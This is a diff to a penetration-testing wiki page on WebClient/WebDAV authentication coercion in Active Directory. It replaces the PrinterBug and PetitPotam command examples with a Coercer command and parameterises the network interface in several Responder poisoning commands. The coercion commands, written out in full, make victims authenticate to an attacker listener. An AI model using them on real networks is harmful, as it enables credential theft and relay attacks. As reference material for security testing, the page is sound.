@@ -55,17 +55,10 @@ The WebDAV Connection String format is: `\\SERVER@PORT\PATH\TO\DIR`.
 > 
 > A heftier alternative is to do some [ADIDNS poisoning](adidns-spoofing.md) to create and use a valid DNS entry.
 
-Below are a few examples of WebClient abuse with [PrinterBug](../print-spooler-service/printerbug.md) and [PetitPotam](rpc-coercions/ms-efsr.md).
+Any [RPC coercion technique](rpc-coercions/ms-rprn.md) can be used to trigger the coercion. The key is to supply the listener address in WebDAV Connection String format (`ATTACKER_NETBIOS_NAME@PORT`) so the victim authenticates over HTTP instead of SMB. [Coercer](https://github.com/p0dalirius/Coercer) (Python) is the recommended tool for this.
 
 ```bash
-# PrinterBug
-dementor.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "VICTIM_IP"
-SpoolSample.exe "VICTIM_IP" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt"
-
-# PetitPotam
-Petitpotam.py "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "VICTIM_IP"
-Petitpotam.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "VICTIM_IP"
-PetitPotam.exe "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "VICTIM_IP"
+coercer coerce -t "$TARGET" -l "ATTACKER_NETBIOS_NAME@PORT" -u "$USER" -p "$PASSWORD" -d "$DOMAIN"
 ```
 
 #### Abuse from multicast poisoning
@@ -77,7 +70,7 @@ In fact, as explained in the article, [Responder](https://github.com/lgandx/Resp
 Below, an example to perform the attack with Responder (Python). At the time of writing, [this pull request](https://github.com/lgandx/Responder/pull/308) must be used.
 
 ```bash
-responder --interface "eth0" -E
+responder --interface "$INTERFACE" -E
 ```
 
 Alternatively, by default, [smbserver.py](https://github.com/fortra/impacket/blob/master/examples/smbserver.py) (Python) from Impacket ends the communications with `STATUS_LOGON_FAILURE`.
@@ -87,7 +80,7 @@ Alternatively, by default, [smbserver.py](https://github.com/fortra/impacket/blo
 python3 smbserver.py $NAME . -smb2support -username notexist -password notexist
 
 # Start Responder in a second terminal
-responder --interface "eth0"
+responder --interface "$INTERFACE"
 ```
 
 The obtained authentications from multicast poisonings in Responder will come from WebDAV, in case the WebClient service is running on the targets.
@@ -130,8 +123,8 @@ By mapping a remote WebDAV server. This can be done by having Responder's server
 
 ```shell
 # starting responder (in analyze mode to prevent poisoning)
-responder --interface "eth0" --analyze
-responder -I "eth0" -A
+responder --interface "$INTERFACE" --analyze
+responder -I "$INTERFACE" -A
 
 # map the drive from the target WebClient needs to be started on
 net use x: http://$RESPONDER_IP/
